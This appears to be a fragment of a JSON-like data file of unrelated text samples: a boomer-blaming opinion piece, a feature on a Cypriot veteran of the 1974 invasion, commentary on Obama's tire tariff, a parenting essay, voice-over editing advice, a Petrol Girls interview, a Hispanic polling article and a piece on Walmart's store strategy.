George W. Bush and Barack Obama — pushed the national debt from $5.6 trillion in 2000, or 55% of GDP, to $18 trillion today, or 103% of GDP. Personal debt skyrocketed, too, thanks to a boomer borrowing binge. Boomers running Wall Street firms such as Lehman Brothers, Citigroup (C) and Bank of America (BAC) generated the 2008 Wall Street meltdown that nearly wrecked the global economy.\n\nBoomers began to flood into the labor force around 1970, when the ratio of CEO pay to that of a typical worker was about 20-to-1. Now, as boomer careers begin to sunset, the CEO-to-worker pay gap has soared to about 230 to 1. There’s loads of other data showing the rich have gotten considerably richer during the past two decades, while much of the middle class has fallen behind. Hedonistic baby-boomer attitudes have produced a new gilded age complete with rock-star entertainment at birthday parties and crass mega-yacht one-upmanship. Megaboomer Larry Ellison buys entire islands with his inexhaustible billions.\n\nMillennials may look at everything the boomers have accomplished wrought and think their parents’ generation are the real jerks. And if millennials don’t think that now, they might when boomers raid Social Secrurity and Medicare, perhaps leaving a few pennies for the next, unfortunate batch of seniors.\n\nThere are, of course, some well-known model citizens among the baby boomers, as there are among any generation. Bill Gates and his charity do admirable work in the developing world. Steve Jobs made technology fun and cool. Oprah Winfrey brought street cred to empathy. The list could go on.\n\nBut boomers as a whole will never be thought of as careful stewards of the institutions they inherited — institutions that are now more likely to be considered corrupt and self-serving than benevolent and humble. Why is anybody surprised millennials are turning out to be cynical, untrusting and mercenary? In the world they see, those traits are necessary to survive.\n\nAs for their attitudes, millennials may channel their parents more than any generation of the past century. The loathsome rich kids of Beverly Hills didn’t get rich on their own; they inherited wealth from baby-boomer parents trying to buy their kids happiness. The Kardashians didn’t create their own wealth, either. It came from a famous criminal lawyer born in 1944 and an opportunistic Olympic legend born in 1949. While emblematic of their selfie-absorbed generation, the Kardashians and their kind are funded by prior generations.\n\nStory continues",
  "latent_15256": "On the outskirts of a mountain village in Turkish-occupied northern Cyprus, Lakis Zavallis, 72 in September, is scrambling about a rocky roadside hillside looking for an imitation-leather grip he had first used when he was a law student in London in the early 60s.\n\nSome 40 years ago he was a lieutenant commanding a diminishing platoon of weary Greek Cypriot National Guardsmen when he hid the bag under the overhang of a rock. They had just been ordered to make what he thought might be a temporary withdrawal from a forward position and he wanted to lighten his load. In it was the English paperback edition of Solzhenitsyn's Cancer Ward and a sweater, for even during the island's scorching summers the Kyrenia range gets chilly at night when you're dodging mortar bombs by living in a hole in the ground.\n\nBeneath the book and the sweater is the item that makes Lakis persist in trying to find his bag. This was his second attempt this year and there have been others. In it is the diary he kept when he found himself part of a shambolic home guard doing its best to take on Nato's biggest army in cold war Europe and one that came with the kind of air and naval support intended to take on the Soviet Union.\n\nThis month sees the 40th anniversary of Operation Attila, Turkey's codename for its invasion of Cyprus. It started on 20 July 1974 and ended almost a month later on 16 August. By then, its forces occupied just over a third of the island in the name of a Turkish Cypriot minority not quite a fifth of its total population. They still do, though May's visit by US vice-president Joe Biden has raised hopes that the elusive settlement to the Cyprus problem might at last be in the offing, if only to divide the spoils of newly discovered offshore natural gas and oil.\n\nOn 15 July 1974, a coup against Archbishop Makarios III, president of Cyprus since 1960 when it stopped being a British colony, was orchestrated by the military junta in Athens who wanted what Greek speakers call enosis. This was the same political union with Greece desired by the Eoka guerrillas who in the late 1950s fought the British under Georgios Grivas, a Cypriot-born Greek army officer. The coup gave Ankara all the reasons it ever needed to launch Operation Attila, which came five days later.\n\nAbout 650 officers in the 15,000- strong Greek Cypriot National Guard were professional soldiers from the junta's Greece. Their passion for enosis was rejected by those Makarios supporters who preferred a Cyprus that was a world away from the weird fascists then ruling democracy's birthplace. Dissenting conscripts got into trouble. In 1972 Doros Zavallis, Lakis's youngest brother who had tasted life under the colonels as a law student in Athens, returned to Cyprus to do his national service. When he was overheard criticising a speech made by an officer, warning them they should be ready to intervene if Makarios took a wrong turn, he was accused of being a communist, given 20 days' detention and sent to a remote coastal outpost monitoring a Turkish enclave.\n\nThese enclaves were guarded by the Turkish Cypriots' own militia, established during a period of inter-communal reciprocal slaughter between 1963 and 1967. Enosis was anathema to them. Their own extremists responded with another single-word slogan: taksim. It meant partition.\n\nChildren play in a park next to a fence marking the United Nations buffer zone in a partially restricted area in the Turkish Cypriot-controlled area of central Nicosia, 2014. Photograph: Neil Hall/Reuters\n\nThe coup was the culmination of a decade of fratricidal Greek Cypriot strife. Athens backed the septuagenarian Grivas, hero of the struggle against the British, who secretly returned to his native island from Greece and set up his Eoka B. Makarios responded by creating a praetorian guard he called the Tactical Police Reserve. When in January 1974 Grivas died of a heart attack, thousands attended his funeral in Limassol and Eoka B, armed by the junta, carried on. But it was some of the National Guard's ancient T-34 tanks, a gift from Russia, that fired the coup's opening shots at the presidential palace. The archbishop had already survived several assassination attempts and his luck held. He escaped to Paphos, his birthplace, from where a British helicopter took him to RAF Akrotiri on the sovereign bases. By the time the Turks had landed, he was already in New York and had just addressed the UN security council.\n\nOn the morning of the invasion Lakis Zavallis, driving a blue Morris Traveller used by his family's printing business in Nicosia, went to the village of Paleiometocho near the capital's airport where he was to report for duty with 366 Reserve Battalion. Names were being taken in a school. It took about 30 minutes and on his way he overtook some of the National Guards' Stalingrad-era T-34s. As he overtook them, the commanders in their open turrets smiled and waved. It was about 8am and the sky was full of contrails made by Turkish Skyhawks. Soon they would be falling on the personnel carriers of the Greek Cypriots' only armoured infantry battalion and kill their commanding officer.\n\nLike most Nicosians, he had been woken shortly after dawn by gunfire, explosions and low-flying aircraft. He had got to the roof of his apartment block with his Super 8 camera in time to film the Turkish paratroops dropping to reinforce the Turkish Cypriot enclave north of the city. Then he got together what bits of uniform he could find, kissed his wife Anita and their two young sons goodbye and left.\n\nIn theory, the Greek Cypriots had in mind the kind of mass mobilisation the Israelis did so well. But Makarios had never dared allow an exercise involving the full call-up of reservists, for fear its Greek officer corps would march them to the presidential palace and dethrone him. Now thousands of Greek Cypriot men were clamouring for the chance to defend their island until the Greeks or the UN or both came to their rescue. They were of both factions, for the coupists had opened the jails and let out all the Makarios supporters they had rounded up, some of them looking rather the worse for wear. \"Of course, that was before most of them had come under fire,\" recalled Lakis. \"But there was a lot of enthusiasm. What was lacking was the apparatus to equip and absorb them.\"\n\nHis two brothers turned up at a reporting centre a couple of minutes' walk from the Zavallis family home where their widowed mother lived. Doros, despite the treatment he received as a conscript, grabbed the last Lee-Enfield rifle from a truck full of small arms and was soon part of a unit heading north. Sophocles, the middle brother who had attended Leeds College of Technology, missed out on the last weapons' distribution and was never mobilised. This turned into very bad luck indeed. During the first and very loosely observed ceasefire he tried to find his brothers. Turkish soldiers shot up his car and he ended up in a mainly Turkish Cypriot ward in the British hospital at Dhekelia being treated for four bullet wounds.\n\nMeanwhile, Lakis and Doros went separately off to war. Doros became the ammunition carrier for a heavy machine gun team but he did occasionally use his Lee-Enfield. Neither he nor his brother had fired a rifle since basic training, which in Lakis's case was almost 10 years ago. Not that he had one to fire until he acquired it from a wounded man after they came under air attack and naval gunfire. Nor did the second lieutenant star on his epaulette mean he was qualified to command frontline infantry. It was there because as a lawyer he was part of the National Guard's legal department.\n\nBut his men didn't know that, and when I met him in the foothills of the Kyrenia range, where the dry earth was being blown into big brown clouds by Turkish artillery, they appeared willing to follow him almost anywhere. Some still do. In May, when the heat was kinder, several of them joined their lieutenant in the search for his bag, though he complained they weren't all as nimble on those rocky terraces as they should be.\n\nMilitary historian Colin Smith was the Observer's chief roving reporter in 1974.

  "latent_15414": "So far, the US government has been diligently repeating each and every mistake committed during The Great Depression. The only thing they had left undone so far was to match the Smoot-Hawley Tarriff Act from 1930, widely recognized as the worst decision during that period:\n\nIn mid 1930 the Smoot-Hawley Tariff is signed into law, raising import tariffs to record highs, and spreading protectionism all over the world – consumers and exporters suffer from the ensuing decline of international trade\n\nNow, president Obama is rushing in to fill that void:\n\nIn a break with the trade policies of his predecessor, President Obama announced on Friday night that he would impose a 35 percent tariff on automobile and light-truck tires imported from China.\n\nThe decision is a major victory for the United Steelworkers, the union that represents American tire workers. And Mr. Obama cannot afford to jeopardize his relationship with major unions as he pushes Congress to overhaul the nation’s health care system.\n\nBut China is certain to be antagonized by the decision, made less than two weeks before Mr. Obama will come face to face with Chinese leaders at a summit meeting in Pittsburgh for the Group of 20 industrialized and fast-growing emerging nations.\n\nThe decision signals the first time that the United States has invoked a special safeguard provision that was part of its agreement to support China’s entry into the World Trade Organization in 2001.\n\nUnder that safeguard provision, American companies or workers harmed by imports from China can ask the government for protection simply by demonstrating that American producers have suffered a “market disruption” or a “surge” in imports from China.\n\nUnlike more traditional anti-dumping cases, the government does not need to determine that a country is competing unfairly or selling its products at less than their true cost.\n\nThe International Trade Commission had already determined that Chinese tire imports were disrupting the $1.7 billion market and recommended that the president impose the new tariffs. Members of the commission, an independent government agency, voted 4-2 on June 29 to recommend that President Obama impose tariffs on Chinese tires for three years. Mr. Obama had until this coming Thursday to make a decision.\n\nAmerican imports of Chinese tires tripled between 2004 and 2008, and China’s share of the American market grew to 16.7 percent, from 4.7 percent, according to the United States Trade Representative. Four American tire factories closed in 2006 and 2007, and several more are set to close this year.\n\nThe Tire Industry Association has opposed the tariffs, arguing that they will not preserve American jobs but will instead cause manufacturers to relocate plants to other countries where they can produce tires cheaply.\n\nPresident George W. Bush received four similar recommendations from the trade commission, the most recent one involving steel pipe in December 2005, but he rejected all of those recommendations. Under the law, the president is allowed to accept or reject the commission’s recommendations.\n\n“The president decided to remedy the clear disruption to the U.S. tire industry based on the facts and the law in this case,” the president’s spokesman, Robert Gibbs, said in a statement Friday night.\n\nMr. Gibbs said the United States, which already imposes a 4 percent tariff on Chinese tires, would impose an additional tariff of 35 percent for one year. The tariff will be reduced to 30 percent in the second year and 25 percent in the third year. The tariff is to take effect on Sept. 26.\n\nThe trade commission proposed higher tariffs than the president actually imposed, recommending an initial levy of 55 percent.\n\nThe president of United Steelworkers International, Leo W. Gerard, applauded Mr. Obama’s decision, saying, “The president sent the message that we expect others to live by the rules, just as we do.”\n\nSenator Sherrod Brown, an Ohio Democrat who had pressed for the tariffs, also praised the decision.\n\nHe said in a statement, “If American workers and manufacturers are going to compete in the global market, they need to have a government that uses trade enforcement tools.”",

  "latent_15514": "A few weeks ago, my husband and I took our daughters to the neighborhood swimming pool. I ran into a colleague and casual friend who was there with her two boys. She was chatting with another mom of two boys, and the four kids were splashing together happily while their moms lounged on the edge of the pool. (Note to self- bring a buddy to the pool next time to enhance Mommy’s relaxation experience.)\n\nMy friend introduced us, and explained that they had all gone to college together, and wound up moving to Colorado at the same time. “We’ve been here for 13 years,” she told me, “and we met their oldest son in the hospital the day after he was born. Our boys are more like cousins than friends.”\n\nI felt a pang of jealousy. These were her “people.” A few weeks ago, 3 Things For Mom ran a post that included this tip: “Find your people.” The full post articulates the importance of surrounding yourself with a tribe, and when I read it, I immediately felt grateful for all the fantastic girlfriends I had in my life.\n\nMy best friends from college who all live less than an hour away from me.\n\nMy two closest friends without kids who keep me grounded and know me as more than Mommy.\n\nMy fellow mom friends who listen without judgment and make me feel less alone.\n\nThe friend who “gets me,” sharing my sensitivity trait and even matching my exact Myers-Briggs type!\n\nMy blogosphere friends, most of whom I have never met, but who relate to my ambitions and frustrations so well.\n\nBut there is one thing that has always felt missing to me- my husband and I don’t have “that family.” You know- the other couple that you both like so much, whose kids are of a similar age. Maybe they live next door and you wander freely into one another’s backyard, understanding that the lack of shower and presence of pajamas is not a deterrent to sharing time. Maybe you’ve known each other since your wild college days, and you’ve navigated the transition into parenthood together. Maybe it’s your sister and her family, and a standing invitation for reciprocal baby-sitting.\n\nWe don’t have those people in our lives- not yet. It’s not that we don’t have friends with kids that we have suffered through birthday parties, street fairs, and carnivals with. It’s not that we don’t have neighbors with kids- we actually love spending time with the other families on our street. But there’s something different about having that couple that you know without a doubt would come stay with your kids if you went into labor in the middle of the night, or who can join you for dinner without inspiring that “hostess” panic. Those people.\n\nIt seems like this type of relationship is very elusive- both the husbands and the wives have to like each other, or worst case, the husbands have to tolerate one another! It helps if the kids are close in age, so you can plan activities that everyone will enjoy. It seems like the kid:kid ratio should be close as well- the family with one child may not mesh well with the family who has two sets of twins. Then of course you factor in proximity, schedules, parenting styles- how can all these factors possibly add up to the perfect dual family friendship?\n\nI don’t want to appear ungrateful for the fantastic, loyal, empathetic friends that I have. Perhaps our inability to align ourselves with another family has more to do with conflicting schedules; I work part-time, and often my children are in school or childcare when my stay at home mom friends are available to socialize. Conversely, my friends who work full-time may not have the same flexibility that I do, and who has time to get together during the infamous Crappy Hour- that mad rush from 4:30-8:00 that involves frantic dinner preparation, a sit-down meal (or not!) and the bedtime countdown?\n\nOne of my favorite HerStories essays, from Christine of A Fly On Our Chicken Coop Wall, shares the story of two families who had weekly community dinners. Reading that post filled me with longing; I have always envied people who had another family that they dined with, played with, and traveled with on a regular basis.\n\nMy cousin lives in a neighborhood with several families whose children are of similar ages; she and her next door neighbor have traded off caring for one another’s children during pregnancy, illness, the post-baby months, or even Get-these-kids-out-of-here-right-now! moments. They often show up in one another’s kitchen, not necessarily having bothered to call or even knock, and frequently join each other for a communal backyard BBQ.\n\nI want that. My parents have a couple they have known since college; their names are Charles and Charlene, and my brother and I have always known them as Uncle Charlie and Aunt Charlie. They haven’t shared a city with my parents in over 35 years, and yet the lack of proximity did not diminish the importance of their role in our lives; we routinely traveled to visit them and their two boys, or hosted them at our house. “The Charlies” were a staple in my life, and a model of what an enriching adult friendship could look like with another family. I have often remarked that I am still looking for “Our Charlies.”\n\nI wonder if I will ever be fortunate enough to have another family that I consider to be my tribe, my people. It is possible that I am romanticizing the idea, but I have the sense that for those who have found their “Charlies”, this type of friendship is life-changing.\n\nHave you found your people? Do you have another family that you spend time with regularly? How has it affected your life?",

Were constantly wondering if we did our best.\n\nIn fact, back in the day it was an oft-heard comment that \"I did my best take in the car going home.\n\nBut what is perfection to you?\n\nIs it reading a script without a mistake?\n\nIs it the mythical One Take?\n\nIs it the painstaking process of recording take after take until everybody is deliriously happy? RECIPE FOR DISASTER\n\nMy opinion is: none of the above.\n\nI have worked with a number of directors who really believe that if you record enough takes, eventually youll get it perfect. What a recipe for disaster! It hardly ever works, and it often drives the voice talent nuts.\n\nMore enlightened directors know that its the result youre after, not how you get there. And since these days youll probably be your own director, it has become easier to focus on the result.\n\nRECORDED, NOT LIVE\n\nAfter all, this is voice over. That means its recorded, not live; its audio, not video. So theres really no reason to get it all perfect in one magical take.\n\nLets say that after two or three takes you feel like you mostly got it. Maybe there were a couple of glitches - a line or two you didnt quite like, or it came in a bit long.\n\nBut that take had something special about it. At this point you dont really need to try for another take, hoping that the magic remains while you iron out the glitches.\n\nLISTEN, THEN EDIT\n\nInstead, I suggest you do two things.\n\nFirst, listen to other takes to see if maybe the glitches in question didnt appear in them; if so, a little cutting and pasting might give you a complete, seamless take.\n\nSecond, if you dont find what you need, do pick-ups and paste them in place. If youre good at matching tone, pace, level, etc.  and if youre adept at seamless editing  you may end up with a \"perfect read. Its something you, the narrator, created with you, the editor.\n\nAt that point, of course, how you define \"perfect is between you and your client. But at least you didnt have to beat yourself senseless to get there.\n\n------------------\n\nABOUT JIM\n\nJim Conlan is a voice actor and narrator with a wide variety of fiction and non-fiction titles available on Audible and in bookstores.

  "latent_15692": "Photograph by Keira-Anee.\n\nDebut Album Talk of Violence Out November Via Bomber Music.\n\nPetrol Girls is wonderfully apt name for this feminist post hardcore quartet from East London. Their music is incendiary, raging with an earnest disgust that is both rousing and inspiring. Advocating complete social and political change, the group have released a succession of singles and EPs over the course of the last three years that are as powerful and cacophonous as they are intelligent and questioning.\n\nVocalist and guitarist with the group, Ren Aldridge, was gracious enough to have a rather in depth chat with us recently. Showing the passion that imbues Petrol Girls’ music, Ren touches on topics of gender, liberalism, conservatism, and the hilarity of dick prints.\n\nO: Your name is inspired by Pétroleuses, mythical women of the Paris commune who allegedly set fire to private property with Molotov cocktails made from milk bottles, and rejected traditional gender roles. What drew you to their story?\n\nRen Aldridge: I heard about them in a talk Laurie Penny was giving on Women and Protest and just immediately thought the loose translation she gave of ‘Petrol Girls’ sounded like a great band name! The more I read into them, the more I felt they symbolised a lot of the politics I wanted to express through the band, and I like the idea of deliberately aligning ourselves with the history of militant direct action from the left.\n\nI also like the fact they are mythical. There were militant women active around the Paris Commune, but the press at the time created this exaggerated idea of them, in order to vilify them. Women, and anyone else who defies the constraints of their gender, have been and will probably continue to be vilified or pacified by conservative dominant powers at whatever point in time. But this vilification just comes from those powers feeling threatened, and a fear of change.\n\nUltimately those trying to vilify les Pétroleuses gave them more power by naming and mythologising them – they became a symbol and part of culture. You can see this pattern throughout feminist history, and I think its most powerful when its adopted deliberately, like the protest group W.I.T.C.H. in the US for example.\n\nO: Your new song, ‘Phallocentric’, deals with the penis as a symbol of male dominance in culture. What do you think needs to be done on a larger scale to balance gender representation in culture?\n\nRA: And how this is both a result of, and backdrop to, a focus on the penis and male pleasure/ dominance in heterosexual sex, which is very … limiting. So much art, music and culture is about sex really, and can be an incredibly powerful way of either maintaining dominant attitudes or breaking them down. I think promoters and curators need to do their job properly and find artists who aren’t just straight white men for their gigs, exhibitions, films etc. I needed to see other women on stage to imagine myself up there.\n\nFestival line ups are still especially shocking. We need to keep shouting about it, and keep the pressure up for things to change. I think its really cool when guys make a statement about it as well. Dennis from Refused says something every time they play about the lack of women on festival bills, and they make a concerted effort to include women on gig line ups that they have a say in. I also recently took part in a brilliant art exhibition run by a Girl Power Liverpool called, ‘Women, where do you find yourselves in the arts?’ which brought together loads of creative women and demanded a conversation about the representation of women in art. We’ve just got to keep on pushing!\n\nO: ‘Phallocentric’ aims to ‘ridicule conservative attitudes’. Do you think there is a balance to be found between conservative and liberal ideals that would be beneficial for all or is that not possible?\n\nRA: I don’t think the idea of a balance between those two ideals even makes sense! Conservative means “averse to change or innovation and holding traditional values” whereas liberal, in its most basic sense, means “willing to respect or accept behaviour or opinions different from one’s own; open to new ideas.” The reason that people tend to be conservative, and resistant to change, is because they hold power and personally benefit from the way things are. Their ideals are concerned with maintaining their dominance: their wealth or power.\n\nWhat would a balance between these two ideals look like? Respecting different ideas to some extent but not “too much”? Allowing a bit of change but nothing that rocks the boat “too much”? I’d actually argue that liberal ideas don’t go far enough and would consider my ideals, and those of Petrol Girls to be radical: advocating complete political or social change. I think holding radical ideals comes from understanding the privilege and power structures that are at play and that oppress certain people because of their gender, race and a whole load of other factors. The world isn’t dominated by straight rich white men because they’re inherently better or more deserving – its structural.\n\nI saw some great graffiti in the toilets in a venue somewhere: “Privilege is when you think something is not a problem, because its not a problem to you personally… you fucking bigot.” We have to think about privilege and power to change society positively.\n\nO: The video for ‘Phallocentric’ looks like it was a lot of fun to make. What is the concept behind the video?\n\nRA: It was so much fun! I think my ear wax is still blue and green..\n\nThere’s this really famous piece of performance art where the artist Yves Klein painted naked women ‘International Klein Blue’ (whilst fully clothed himself – suited up in fact!) then ‘conducted’ them printing their bodies and using themselves like paintbrushes. This happened in the early 1960’s which is a really interesting point in time for performance art. If you think about how the female body has been treated throughout art history then you can see the logic in Klein painting naked women blue. Klein’s art was pretty ground breaking conceptually, but totally maintained patriarchal values. Instead of just painting pictures of naked women, he got actual naked women to act as paintbrushes themselves. It kind of makes the sexism even more obvious in this newer context.\n\nAnyway, I’d messed around with painting myself multi-coloured and making body prints when I was at art school, and felt like playing with this idea fitted really well with ‘Phallocentric’. The intro shows a straight forward subversion of Klein’s piece, with me, fully clothed, painting a naked man blue and making him print his body. I added a cheeky butt slap to emphasise the sexual nature of this power dynamic, which has proved controversial with YouTube’s righteous MRAs, as you might expect. After this straight forward subversion, Klein’s idea is then exploded as various pairs of different genders, sexual orientations and levels of intimacy paint each other different colours. Their body prints are also layered on the film. (Dick prints are hilarious.) The chorus lyric is “Unleash disorder, fuck what they taught us” which rejects conservative attitudes to sex and celebrates the whole rainbow of possibilities. Andrew Northrop who filmed and edited the video decided to shoot it as two screens so that one could be more like an art film and the other more like a standard music video, which is genius because its a song about art and sex.\n\nO: Recently, you expressed solidarity with the Tuts in relation to the abhorrent sexist reaction they received at Undercover fest. What do you think can be done to tackle this type of sexism towards women at gigs and festivals?\n\nRA: Listen to the women affected and to what they want to do about it.\n\nDon’t try and tell women that they’re wrong about their own experiences.\n\nLet them take it into their own hands if they want to.\n\nGood Night Out campaign is an excellent starting point for training venue or festival staff in how to deal with incidents of sexual violence, and displaying Good Night Out posters can help give people receiving harassment the confidence to report it, and do something towards stopping assholes doing this shit. There should be zero tolerance for sexual assault and harassment in gig and festival spaces. Love Sex Hate Sexism also produce excellent posters and flyers explaining ideas about consent, which does loads to prevent this shit happening in the first place, and can help victims feel more confident about fighting back.\n\nO: Will ‘Phallocentric’ be a stand alone single, or do you have any upcoming plans to record an album?\n\nRA: It’s on our debut full length Talk of Violence which is coming out in November on Bomber Music. We’ll have physical copies of it on our October/ November tour leading up to the release, so come out to a show if you want to get your hands on a copy before then.\n\nO: Another recent single of yours is ‘Treading Water’. What inspired that song?\n\nRA: ‘Treading Water’ mixes up loads of different influences and thoughts about borders, austerity, violence and climate change. Some of the lyrics are an attempt to co-opt the scaremongering language of the media e.g. ‘waves’ of immigration. Other lyrics place the imagined voices of groups that are often pitted against each other, side by side, blending them in places. I wanted to put an imagined migrant voice next to an imagined skint European voice and allow the different voices to make new sentences together, like “Those who take// my hands.” Its so important that as antifascists we don’t totally ignore the voices of economically deprived Europeans because those are the communities where fascism has traditionally been able to take hold as migrants get scapegoated for problems that are really caused by bosses, austerity and capitalism. We need to talk about how our struggles connect and stand in solidarity with each other. Treading Water most obviously refers to the current genocide in the mediterranean see, as people aren’t allowed to cross safely because they don’t have the “right” fucking passport. But its also about treading water – trying to keep your head above water – financially.\n\nInfluence’s include Kate Tempest’s song ‘Europe is Lost’, ideas from ‘This Changes Everything’ by Naomi Klein, stories people have told, and a flyer about different forms of violence that was circulated at anti-austerity demonstrations in London about five years ago. The song is an expression of, and hopefully a call for more active, solidarity with people without papers, which forms part of a longer struggle against borders, capitalism, the nation state and the violence these structures produce.\n\nO: What is success for Petrol Girls?\n\nRA: Survival! Finding a way to get by whilst doing this band and not compromising on our politics. And being part of a counter culture that can shift people’s attitudes in Europe away from all the scary fascist bullshit we’re seeing at the moment. I think music and art can be useful ways of trying to get our heads around what’s happening, and build up communities that we can root our resistance in. It’s mainstream culture that’s maintaining ideas like national pride and the gender binary, so I really believe counter culture has an important role to play in smashing this.\n\nFollow Petrol Girls on Facebook.\n\nFollow Overblown on Facebook and Twitter.",

  "latent_16043": "Hispanics are not yet sold on Hillary Clinton, who struggles to crack 60 percent among the voting bloc in poll after poll — putting her in a deep hole as she tries to rebuild the coalition that powered President Obama to two White House victories.\n\nMr. Obama’s 71 percent of the Hispanic vote in 2012 stunned Republicans, and party strategists said it was a large part of the explanation for his re-election. Mrs. Clinton, however, polls as low as 50 percent among Hispanics in head-to-head surveys in the weeks since Donald Trump sewed up enough delegates for the Republican Party nomination.\n\nThat’s not to say Hispanics are jumping on the Trump bandwagon. Indeed, while some surveys show him winning as much as 31 percent — which would be more than 2012 Republican presidential nominee Mitt Romney — others put his support among Hispanics as low as 14 percent.\n\nThat leaves as much as a fifth of voters not sold on either Mrs. Clinton or Mr. Trump, and Democrats need them more than Republicans.\n\n“They may be offended by Trump, but when they look at Hillary, generally they say, ‘One is insulting us, the other wants to take advantage of us politically.’ It presents a very interesting situation for Latinos,” said Alfonso Aguilar, executive director of the Latino Partnership for Conservative Principles.\n\nMrs. Clinton’s backers aren’t worried. They say voters will come around once the Democratic primary is concluded and supporters of Sen. Bernard Sanders — particularly young Hispanics enthralled with his more generous promises on immigration and economic policy — come back into the party’s fold.\n\nBut immigrant rights advocates warn that Democrats cannot assume massive Hispanic turnout for Mrs. Clinton. America’s Voice, a leading advocacy group, said the Democratic Party needs to promote more actively its support for legalizing immigrants and canceling deportations and must invest in a registration and turnout operation.\n\n“While the fundamentals of the election look strong for Democrats, realizing this potential opportunity will be possible only if Democrats up and down the ballot lean into issues such as immigration, make a sustained investment in registration and turnout, and in the process energize the Latino voting community and other portions of the rising American electorate,” the group said in an election analysis.\n\nThe best Mrs. Clinton does in national polling is 62 percent — a mark she hit in the latest Fox News survey. Her lowest was 50 percent, which she scored in a Progressive Policy Polling survey that also included potential third-party candidates such as former New Mexico Gov. Gary Johnson, a potential Libertarian Party nominee. In that poll Mr. Trump scored just 14 percent support.\n\nWorse yet, Mrs. Clinton’s favorables and unfavorables among Hispanics are about equal in polling. Mr. Trump’s rating is decidedly negative, but Mr. Sanders’ rating is overwhelmingly positive, underscoring that candidates — not just party identification — matter.\n\nAnalysts said Mrs. Clinton may be dragged down by her record. While in the Senate she voted to build 700 miles of border fencing, and when the surge of Central American illegal immigrants first hit in 2014, her initial reaction was to say they should be quickly deported.\n\nShe’s softened her stance on both issues during this year’s campaign, but Mr. Aguilar said Hispanic voters see her as opportunistic.\n\nMr. Aguilar said there’s even an opening for Mr. Trump to win a much larger portion of the vote — but he’d have to modify his stances, embracing some form of legalization for the current illegal immigrant population.\n\n“The wall is not the problem with Latino voters. The problem is legalization,” said Mr. Aguilar, who added that, as of now, he won’t be able to support Mr. Trump either.\n\nJohn McLaughlin, a longtime Republican pollster, released a national poll last week putting Mr. Trump at 27 percent support, which is what Mr. Romney got in 2012. Mrs. Clinton had 55 percent in that survey.\n\n“People are not crazy about Hillary Clinton, and that’s an understatement,” Mr. McLaughlin said, saying that the same trends that are affecting her numbers overall are also playing out among Hispanics.\n\nHe said some Hispanics who are new arrivals, particularly Mexicans, are likely overwhelmingly opposed to Mr. Trump, but those who’ve been here longer and who have deeper roots are less monolithic.\n\nMr. Trump announced his campaign in June 2015 with a fierce denunciation of illegal immigration, vowing to build a border wall and to make Mexico pay for it. And he attacked Mexican society, saying it sends “rapists” and other bad elements to the U.S.\n\nHispanic Democrats have said, with language like that, there’s no chance Mr. Trump even equals Mr. Romney’s poor 2012 showing of 27 percent, no matter how divisive the Democratic primary.\n\n“Are there young millennial Latinos who are voting for Bernie? Absolutely they are. And you’re going to tell me those same millennial Latinos are somehow going to wake up next November and vote for Donald Trump? I don’t see it happening,” said Rep. Luis V. Gutierrez, an Illinois Democrat and perhaps the most prominent Hispanic officeholder in Washington.\n\nA PPP survey of Arizona found Mrs. Clinton doing much better there than she is nationally among Hispanics. She earned 67 percent support in the poll, compared to 21 percent for Mr. Trump.\n\nMr. Gutierrez said it’s not just Mexicans who react to Mr. Trump’s harsh rhetoric. He said when Latinos hear attacks on Mexicans now, they extrapolate to the entire Hispanic community and bristle.\n\n“What you’ve got to understand about Latinos is that when you say ‘Mexicans,’ the vast majority of Latinos understand that it’s them,” he said.\n\nBut Michael McKenna, a GOP strategist, doubted that was the case, and said Mr. Trump’s showing among Hispanics may not be a fluke.\n\n“Trump’s attack has not been against Hispanics. Trump’s attack has been against Mexicans, and in this country and every other country, nobody identifies himself as Hispanic, they identify themselves as ‘I’m Mexican,’ ‘I’m Guatemalan,’ ‘I’m Colombian,’” said Mr. McKenna. “If you think the Spanish speakers are all uniform — don’t be ridiculous.”\n\nMr. McKenna, who correctly predicted then-President George W. Bush’s surge — to more than 40 percent — of the Hispanic electorate in his 2004 re-election, said some Hispanic voters may even be drawn to Mr. Trump’s bold style of leadership.\n\n“There’s a reason why the Spanish-speaking world has been host to some of the most interesting dictators of the last 200 years,” he said. “Some people in every culture prefer strong leaders to weak leaders.”\n\nCopyright © 2019 The Washington Times, LLC.

  "latent_16162": "Walmart may be the world's biggest retailer, but has lost a bit of its swagger in recent years. The chain has been cutting costs so much that it's struggling to keep some shelves stocked and scrambling to keep up in the instant-delivery age of Amazon. Dollar stores are eating into its low-end customer base; its higher-end urban stores have been slow to emerge; and its international expansion has had some high-profile setbacks.\n\nOn Tuesday, Walmart executives told investors that they aren't taking that beating lying down. They have a path to growth, and it has something to do with what they call \"ecosystems.\"\n\nLet me explain.\n\nMore like this. (Sonny Hedgecock/AP)\n\nIn Walmart's thinking, there are three types of shopping trips: There's the stock-up mission, which brings families to Walmart's 3,200 nationwide Supercenters. There's the basic grocery run, when shoppers want to go someplace nearby and more navigable, such as one of Walmart's 300 \"neighborhood markets.\" And there's the \"immediate access\" stop, when shoppers head for the traditional convenience store. That convenience stop is the segment Walmart hasn't really touched, except for a handful of \"express\" stores in Arkansas.\n\nPut the three together, and you get an \"ecosystem,\" as chief executive Bill Simon described on Tuesday. In a time of domestic oversaturation and overseas obstacles, this is the model the retailer is banking on to satisfy ever growth-hungry investors.\n\nThe key to making the ecosystem work, Walmart says, is \"tethering.\" You can tether your hiring and back-office functions together for greater efficiency. You can tether your inventory distribution systems so that fresh items can be sent out from the giant supercenters quickly in response to demand. You can even tether your online orders, so that anything a customer might want can be delivered to a nearby market that day. The theory: Rather than one huge store that offers endless goods all in the same place, you have three stores that offer most of those goods, at the time and place you want them.\n\nWhat they're thinking, basically. (Walmart)\n\n\"So, imagine you're at work, and you decide you need gas on your way home, and you know that Walmart Express store -- because you go by it every single day -- has fuel, and you decide what you want for dinner, and you want a rotisserie chicken, and, by the way, later that night, you decided that you'd like to play scrabble with your spouse,\" Simon said. \"I mean, go on your phone, let the store know that you want a scrabble board, certainly something that's not going to be carried in a 10,000 SKU assortment, and it will be there, ... or a sewing machine or anything that's in the Supercenter assortment.\"\n\nA dollar store that can get you a Scrabble board on short notice? Walmart's building at least another 120 of them over the next year. That way, the retailer's thinking goes, you've got Walmart all around you, for nearly anything you might need at any time.",
